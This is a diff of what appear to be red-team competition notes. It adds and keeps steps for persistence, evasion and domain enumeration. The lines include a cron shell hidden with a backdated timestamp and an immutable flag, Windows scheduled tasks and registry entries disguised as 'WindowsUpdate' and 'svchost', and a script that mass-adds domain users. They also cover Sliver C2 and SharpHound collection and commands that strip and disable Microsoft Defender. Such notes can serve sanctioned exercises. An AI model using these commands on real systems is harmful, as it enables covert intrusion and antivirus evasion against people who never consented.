@@ -29,6 +29,7 @@
       - Upload shell to `/etc/cron.hourly/locate`, `touch -d "12 Jul 2024" /etc/cron.hourly/locate` to make it non-sus, and `chattr +i /etc/cron.hourly/locate`
         - Has to start with a `#!/bin/bash`
   - Windows:
+    - When installing the exes, make sure to use `-o` with `iwr` or we'll just get the HTTP connection info lmfao
     - Scheduled tasks: `persistence install --method schtask --name "WindowsUpdate" --interval 600 --hidden`
     - Registry (run on login?): `persistence install --method registry --name svchost`
     - WMI: `persistence install --method wmi --name "WindowsWMIUpdate"`
@@ -39,6 +40,8 @@
     - Backdooring domain:
       - `./mass_user_add_local.sh`
         - This adds a bunch of users to the domain
+    - MSSQL server:
+      - Theoretically, we could set up an additional MSSQL server in order
 - Web apps:
   - Get in, change passwords, modify something about the web app or use it for access
 
@@ -75,6 +78,9 @@
 - `beacons` to show active beacons
   - `use {beacon_id}` to use a beacon
     - `interactive` to turn it into a normal session
+- Armory:
+  - Install all with `armory install all`
+  - Sharphound: `sharp-hound-4 -- '-c all,GPOLocalGroup'`shs
 
 **Killing Services**
 - Soft breaks:
@@ -138,8 +144,6 @@
 
 **Todo:**
 - Practice using sliver for session management
-  - Get a payload working for windows
-    - Try a couple more architectures on a couple more windows boxes. Maybe akash's is jank
 - Make windows persistence script? If we can get sliver working, this should be taken care of
 - 
 
@@ -169,6 +173,7 @@ for ($i = 1; $i -le $N; $i++) {
     - `reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`
     - `gpedit.msc` > Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Turn off Microsoft Defender Antivirus > Enabled
     - Powershell:
+      - `C:\Program Files\Windows Defender\MpCmdRun.exe -RemoveDefinitions -All`
       - `Set-MpPreference -DisableRealtimeMonitoring $true`
       - `Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI`
       - `Stop-Service WinDefend -Force`
